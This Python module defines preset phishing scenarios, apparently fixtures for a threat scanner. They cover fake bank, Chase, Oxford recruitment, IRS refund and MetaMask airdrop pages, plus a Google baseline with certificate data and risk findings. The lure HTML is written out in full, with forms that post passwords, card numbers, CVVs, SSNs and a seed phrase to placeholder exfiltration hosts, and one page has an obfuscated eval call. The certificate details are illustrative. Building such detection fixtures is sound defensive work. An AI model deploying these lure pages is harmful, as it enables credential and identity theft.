"""
Preset Realistic Attack Scenarios & Simulation Vectors
Provides pre-configured threat models demonstrating:
- eMudhra CA weak key generation incident
- Banking credential harvester (Chase lookalike)
- University / recruitment scam (Oxford careers impersonation)
- Government tax refund phishing lure
- Web3 / crypto wallet drainer
- Clean legitimate enterprise baseline (Google)
"""

from typing import Dict, Any

SCENARIO_VECTORS: Dict[str, Dict[str, Any]] = {
    "emudhra-ca-incident": {
        "id": "emudhra-ca-incident",
        "title": "eMudhra CA Weak Key Impersonation & CT Omission",
        "category": "Certificate Authority Vulnerability & MitM",
        "url": "https://secure-banking-auth.net/login",
        "description": "Simulates the exact threat vector exposed during the eMudhra TLS certificate incident: a fraudulent certificate issued by an affected CA with defective key entropy, missing Certificate Transparency logging, and automated DV mismatch on a financial target.",
        "html_content": """
            <html>
            <head><title>Secure Banking Authentication</title></head>
            <body>
                <div class="urgent-banner">SECURITY ALERT: Immediate KYC Verification Mandatory within 24 hours to prevent account suspension.</div>
                <form action="https://exfil-node-c2.top/api/steal" method="POST">
                    <input type="text" name="customer_id" placeholder="Bank Customer ID" required />
                    <input type="password" name="password" placeholder="Online Banking Password" required />
                    <input type="text" name="cardnumber" placeholder="Debit Card Number (16-digits)" required />
                    <input type="password" name="cvv" placeholder="CVV" required />
                    <button type="submit">Verify Identity Now</button>
                </form>
            </body>
            </html>
        """,
        "headers": {
            "Server": "Apache/2.2.15 (CentOS) PHP/5.3.3",
            "X-Powered-By": "PHP/5.3.3",
            "Content-Type": "text/html; charset=UTF-8"
        },
        "cert_data": {
            "has_tls": True,
            "status": "COMPROMISED_RISK",
            "subject": {"cn": "secure-banking-auth.net", "org": "Anonymous Domain Proxy"},
            "issuer": {
                "cn": "eMudhra Sub-CA 2024",
                "org": "eMudhra Technologies Limited"
            },
            "validity": {
                "not_before": "2026-11-08T00:00:00Z",
                "not_after": "2027-11-08T00:00:00Z",
                "days_remaining": 364,
                "total_days": 365,
                "age_days": 1,
                "is_expired": False
            },
            "cryptography": {
                "key_type": "RSA (Weak CA Entropy Defect)",
                "key_size": 2048,
                "signature_algorithm": "sha256WithRSAEncryption",
                "fingerprint_sha256": "4a71b128f9c2e0b57134d1938fa2c61093ebca591244e4fa431f4a9b6b72a910",
                "serial_number": "0x3f91a27e800c1920"
            },
            "certificate_transparency": {
                "sct_embedded": False,
                "sct_count": 0,
                "status": "OMITTED_OR_DELAYED (CT Non-Compliant)"
            },
            "weak_key_anomaly": True,
            "chain": [
                {
                    "level": "Root CA",
                    "name": "eMudhra Root CA (Browser Distrust / Probation Watchlist)",
                    "trusted": False,
                    "notes": "Distrusted by major browser roots due to key generation flaws & compliance failures."
                },
                {
                    "level": "Intermediate CA",
                    "name": "eMudhra Sub-CA 2024",
                    "trusted": False,
                    "notes": "Serial: 0x3f91a27e800c1920"
                },
                {
                    "level": "Server Leaf Certificate",
                    "name": "secure-banking-auth.net",
                    "trusted": False,
                    "notes": "Weak Modulus Entropy | Missing SCTs"
                }
            ],
            "findings": [
                {
                    "category": "Certificate Authority Trust",
                    "severity": "CRITICAL",
                    "title": "eMudhra CA Flagged (Browser Distrust Action)",
                    "detail": "Certificate is issued by eMudhra, subject to browser trust deprecation following audit discoveries of defective key generation RNG, unlogged certificates, and unauthorized issuance.",
                    "penalty": 45
                },
                {
                    "category": "Cryptographic Key Generation",
                    "severity": "CRITICAL",
                    "title": "Weak RSA Modulus Entropy (Defective RNG Pattern)",
                    "detail": "Modulus bits exhibit predictable factor patterns identical to CVE-2024 CA key generation vulnerabilities.",
                    "penalty": 40
                },
                {
                    "category": "Certificate Transparency (CT)",
                    "severity": "HIGH",
                    "title": "Certificate Transparency Logging Omitted",
                    "detail": "Certificate lacks required SCT timestamps. Modern browsers mandate CT logging to prevent covert certificate creation.",
                    "penalty": 25
                }
            ],
            "threat_score": 85
        }
    },

    "chase-credential-harvester": {
        "id": "chase-credential-harvester",
        "title": "Chase Bank Lookalike & Webhook Exfiltration",
        "category": "Financial Phishing & Credential Theft",
        "url": "https://chase-security-verify-auth.xyz/signin",
        "description": "Combosquatting attack impersonating JPMorgan Chase & Co. featuring aggressive psychological urgency, password and SSN harvesting, and real-time exfiltration via a Discord webhook API.",
        "html_content": """
            <html>
            <head><title>Chase Online - Account Verification</title></head>
            <body>
                <h2>Urgent action required: Account suspended within 24 hours</h2>
                <p>Unauthorized access detected on your Chase debit card. Please confirm your credentials.</p>
                <form action="https://discord.com/api/webhooks/1234567890/abc-stolen-creds" method="POST">
                    <input type="text" name="username" placeholder="Chase Username" />
                    <input type="password" name="password" placeholder="Password" />
                    <input type="text" name="social_security" placeholder="Social Security Number (SSN)" />
                    <input type="text" name="cardnumber" placeholder="Card Number" />
                    <input type="password" name="cvv" placeholder="CVV" />
                    <button type="submit">Verify & Unlock Account</button>
                </form>
                <script>document.oncontextmenu = function() { return false; };</script>
            </body>
            </html>
        """,
        "headers": {
            "Server": "nginx/1.18.0",
            "Content-Type": "text/html"
        },
        "cert_data": {
            "has_tls": True,
            "status": "COMPROMISED_RISK",
            "subject": {"cn": "chase-security-verify-auth.xyz", "org": "Let's Encrypt Free DV"},
            "issuer": {"cn": "R3", "org": "Let's Encrypt"},
            "validity": {
                "not_before": "2026-11-09T01:00:00Z",
                "not_after": "2027-02-09T01:00:00Z",
                "days_remaining": 89,
                "total_days": 90,
                "age_days": 0,
                "is_expired": False
            },
            "cryptography": {
                "key_type": "RSA",
                "key_size": 2048,
                "signature_algorithm": "sha256WithRSAEncryption",
                "fingerprint_sha256": "9b12fe39048a1290bb341019dfca72e50912ab12348911bca090e821fa987102",
                "serial_number": "0x4091a1827000"
            },
            "certificate_transparency": {"sct_embedded": True, "sct_count": 2, "status": "VERIFIED"},
            "chain": [
                {"level": "Root CA", "name": "ISRG Root X1", "trusted": True, "notes": "Automated Free CA"},
                {"level": "Intermediate CA", "name": "R3", "trusted": True, "notes": "Domain Validated Only"},
                {"level": "Server Leaf Certificate", "name": "chase-security-verify-auth.xyz", "trusted": False, "notes": "Brand Mismatch"}
            ],
            "findings": [
                {
                    "category": "CA Brand Impersonation Mismatch",
                    "severity": "CRITICAL",
                    "title": "Enterprise Banking vs Automated Free DV Certificate",
                    "detail": "JPMorgan Chase utilizes high-assurance Extended Validation (EV) certificates from DigiCert. This domain employs a transient, 90-day free DV cert issued hours ago.",
                    "penalty": 35
                },
                {
                    "category": "Temporal Heuristics",
                    "severity": "HIGH",
                    "title": "Freshly Minted Certificate (< 24 Hours Old)",
                    "detail": "Certificate was generated within the last few hours, typical of burst phishing campaigns.",
                    "penalty": 25
                }
            ],
            "threat_score": 60
        }
    },

    "oxford-recruitment-scam": {
        "id": "oxford-recruitment-scam",
        "title": "Oxford University Fake Recruitment & Career Portal",
        "category": "Recruitment & Academic Scam",
        "url": "http://oxford-portal-careers.xyz/apply",
        "description": "Simulates a fraudulent academic recruitment portal targeting prospective international faculty and students, soliciting passport identification and payment fees over plaintext HTTP.",
        "html_content": """
            <html>
            <head><title>Oxford University - International Career Portal</title></head>
            <body>
                <h1>Faculty Appointment & Scholarship Application</h1>
                <p>Congratulations! Selected for interview - submit registration fee and passport documentation.</p>
                <form action="http://foreign-exfil.xyz/upload.php" method="POST">
                    <input type="text" name="applicant_name" placeholder="Full Legal Name" />
                    <input type="text" name="national_id" placeholder="Passport / National Identity ID" />
                    <input type="text" name="cardnumber" placeholder="Processing Fee Payment Card" />
                    <input type="text" name="cvv" placeholder="CVV" />
                    <button type="submit">Submit Official Application ($120 Fee)</button>
                </form>
            </body>
            </html>
        """,
        "headers": {
            "Server": "LiteSpeed",
            "Content-Type": "text/html"
        },
        "cert_data": {
            "has_tls": False,
            "status": "NO_CERTIFICATE",
            "subject": {"cn": "None", "org": "None"},
            "issuer": {"cn": "None", "org": "None"},
            "validity": {},
            "cryptography": {},
            "certificate_transparency": {"sct_embedded": False, "status": "NONE"},
            "chain": [],
            "findings": [
                {
                    "category": "Transport Encryption",
                    "severity": "CRITICAL",
                    "title": "Unencrypted Plaintext HTTP for Academic Portal",
                    "detail": "University portal claims to handle passport and payment data with zero encryption.",
                    "penalty": 50
                }
            ],
            "threat_score": 50
        }
    },

    "irs-tax-refund-portal": {
        "id": "irs-tax-refund-portal",
        "title": "IRS Federal Tax Refund Impersonation Portal",
        "category": "Government & Citizen Identity Theft",
        "url": "https://gov-irs-tax-refund-claim.online/direct-deposit",
        "description": "Deceptive government impersonation harvesting taxpayer social security numbers, banking details, and driver license photos with counterfeit government emblems.",
        "html_content": """
            <html>
            <head><title>Internal Revenue Service - Tax Refund Pending</title></head>
            <body>
                <h1>TAX REFUND PENDING: Immediate action required to claim your refund of $1,420.00</h1>
                <form action="https://drop-server-node.biz/receive" method="POST">
                    <input type="text" name="ssn" placeholder="Social Security Number (SSN)" required />
                    <input type="text" name="account_num" placeholder="Bank Routing & Account Number" required />
                    <input type="text" name="cardnumber" placeholder="Debit Card to credit funds" required />
                    <input type="password" name="cvv" placeholder="Security Code (CVV)" required />
                    <button type="submit">Claim Direct Deposit Refund</button>
                </form>
            </body>
            </html>
        """,
        "headers": {
            "Server": "Cloudflare-Worker-Proxy",
            "Content-Type": "text/html"
        },
        "cert_data": {
            "has_tls": True,
            "status": "COMPROMISED_RISK",
            "subject": {"cn": "gov-irs-tax-refund-claim.online", "org": "ZeroSSL DV"},
            "issuer": {"cn": "ZeroSSL ECC Domain CA", "org": "ZeroSSL"},
            "validity": {
                "not_before": "2026-11-07T00:00:00Z",
                "not_after": "2027-02-07T00:00:00Z",
                "days_remaining": 88,
                "total_days": 90,
                "age_days": 2,
                "is_expired": False
            },
            "cryptography": {
                "key_type": "ECDSA",
                "key_size": 256,
                "signature_algorithm": "ecdsa-with-SHA256",
                "fingerprint_sha256": "55c4129e0018a101fce8100192abbfa1928019912001bbcca19200aa9182bb19",
                "serial_number": "0x1290aff1"
            },
            "certificate_transparency": {"sct_embedded": True, "sct_count": 2, "status": "VERIFIED"},
            "chain": [
                {"level": "Root CA", "name": "USERTrust ECC CA", "trusted": True, "notes": "Public CA"},
                {"level": "Intermediate CA", "name": "ZeroSSL ECC Domain CA", "trusted": True, "notes": "Free Automated DV"},
                {"level": "Server Leaf Certificate", "name": "gov-irs-tax-refund-claim.online", "trusted": False, "notes": "US Gov Impersonation"}
            ],
            "findings": [
                {
                    "category": "CA Brand Impersonation Mismatch",
                    "severity": "CRITICAL",
                    "title": "US Federal Government Entity on Non-.gov Domain",
                    "detail": "Legitimate US Federal IRS services reside strictly on '.gov' domains with DigiCert Federal Trust certificates. This domain uses a commercial free DV cert.",
                    "penalty": 40
                }
            ],
            "threat_score": 60
        }
    },

    "crypto-web3-drainer": {
        "id": "crypto-web3-drainer",
        "title": "Web3 Phishing & MetaMask Wallet Drainer",
        "category": "Cryptocurrency & Digital Assets",
        "url": "https://metamask-airdrop-claim-rewards.top/connect",
        "description": "Cryptocurrency drainer targeting MetaMask, Phantom, and Coinbase Wallet users. Lures users with free NFT/token airdrops, then executes malicious token approval smart contract scripts.",
        "html_content": """
            <html>
            <head><title>MetaMask Foundation - Claim Exclusive Airdrop</title></head>
            <body>
                <h1>Claim your refund / airdrop of 2.5 ETH now</h1>
                <p>Connect wallet and confirm your credentials before the claim period expires in 2 hours.</p>
                <form action="https://wallet-drainer-c2.top/drain" method="POST">
                    <input type="password" name="seed_phrase" placeholder="12 or 24-Word Secret Recovery Phrase" />
                    <button type="submit">Connect & Claim $4,800</button>
                </form>
                <script>
                    eval(unescape('%77%69%6e%64%6f%77%2e%65%74%68%65%72%65%75%6d%2e%72%65%71%75%65%73%74'));
                </script>
            </body>
            </html>
        """,
        "headers": {
            "Server": "Caddy",
            "Content-Type": "text/html"
        },
        "cert_data": {
            "has_tls": True,
            "status": "COMPROMISED_RISK",
            "subject": {"cn": "metamask-airdrop-claim-rewards.top", "org": "None"},
            "issuer": {"cn": "R3", "org": "Let's Encrypt"},
            "validity": {
                "not_before": "2026-11-08T00:00:00Z",
                "not_after": "2027-02-08T00:00:00Z",
                "days_remaining": 89,
                "total_days": 90,
                "age_days": 1,
                "is_expired": False
            },
            "cryptography": {
                "key_type": "RSA",
                "key_size": 2048,
                "signature_algorithm": "sha256WithRSAEncryption",
                "fingerprint_sha256": "cc910129f120019283719001bca9100293847192830192830192830192830192",
                "serial_number": "0x582103901"
            },
            "certificate_transparency": {"sct_embedded": True, "sct_count": 2, "status": "VERIFIED"},
            "chain": [
                {"level": "Root CA", "name": "ISRG Root X1", "trusted": True, "notes": "Automated DV CA"},
                {"level": "Intermediate CA", "name": "R3", "trusted": True, "notes": "DV Intermediate"},
                {"level": "Server Leaf Certificate", "name": "metamask-airdrop-claim-rewards.top", "trusted": False, "notes": "Web3 Brand Spoofing"}
            ],
            "findings": [
                {
                    "category": "Brand Impersonation",
                    "severity": "CRITICAL",
                    "title": "MetaMask Brand Impersonation on High-Risk TLD (.top)",
                    "detail": "Adversary combosquats MetaMask brand name on high-abuse .top registrar.",
                    "penalty": 40
                }
            ],
            "threat_score": 60
        }
    },

    "legitimate-google-baseline": {
        "id": "legitimate-google-baseline",
        "title": "Google LLC - Legitimate Enterprise Reference",
        "category": "Clean Baseline / Verified Reference",
        "url": "https://accounts.google.com/signin",
        "description": "Clean reference scan of genuine Google authentication infrastructure demonstrating EV/OV enterprise TLS certificates, strict HSTS preloading, multi-layered CSP, and 0 risk score.",
        "html_content": """
            <!DOCTYPE html>
            <html>
            <head><title>Sign in – Google accounts</title></head>
            <body>
                <h1>Sign in to your Google Account</h1>
                <form action="/signin/v2/identifier" method="POST">
                    <input type="email" name="identifier" placeholder="Email or phone" />
                    <button type="submit">Next</button>
                </form>
            </body>
            </html>
        """,
        "headers": {
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
            "Content-Security-Policy": "script-src 'report-sample' 'nonce-xyz' 'unsafe-inline' 'strict-dynamic' https: 'unsafe-eval'; object-src 'none'; base-uri 'self';",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "Server": "sffe",
            "Content-Type": "text/html; charset=utf-8"
        },
        "cert_data": {
            "has_tls": True,
            "status": "VALID_TLS",
            "subject": {"cn": "*.google.com", "org": "Google LLC"},
            "issuer": {"cn": "WR2", "org": "Google Trust Services"},
            "validity": {
                "not_before": "2026-10-01T00:00:00Z",
                "not_after": "2027-01-01T00:00:00Z",
                "days_remaining": 53,
                "total_days": 92,
                "age_days": 39,
                "is_expired": False
            },
            "cryptography": {
                "key_type": "ECDSA (secp256r1)",
                "key_size": 256,
                "signature_algorithm": "ecdsa-with-SHA256",
                "fingerprint_sha256": "31b99a80e451b68bbbb64b5ca3760451a37c0ff7ef07df6c278fb128d9a4b335",
                "serial_number": "0x1b79e2730b201"
            },
            "certificate_transparency": {"sct_embedded": True, "sct_count": 3, "status": "VERIFIED"},
            "chain": [
                {"level": "Root CA", "name": "GTS Root R4", "trusted": True, "notes": "Google Trust Services Public Root"},
                {"level": "Intermediate CA", "name": "WR2", "trusted": True, "notes": "Intermediate CA"},
                {"level": "Server Leaf Certificate", "name": "*.google.com", "trusted": True, "notes": "Verified Enterprise"}
            ],
            "findings": [
                {
                    "category": "Identity Verification",
                    "severity": "INFO",
                    "title": "Verified Google Enterprise Certificate",
                    "detail": "Certificate is cryptographically valid, logged in multiple independent CT logs, and issued by Google Trust Services.",
                    "penalty": 0
                }
            ],
            "threat_score": 0
        }
    }
}
